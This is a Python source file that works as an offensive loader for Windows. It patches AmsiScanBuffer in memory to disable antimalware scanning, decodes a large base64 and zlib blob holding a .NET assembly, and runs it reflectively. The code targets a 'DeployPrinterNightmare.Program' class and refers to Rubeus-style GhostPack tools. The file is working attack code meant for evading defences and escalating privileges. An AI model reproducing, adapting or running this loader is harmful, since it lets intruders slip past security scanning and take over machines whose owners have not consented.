import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("DeployPrinterNightmare.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()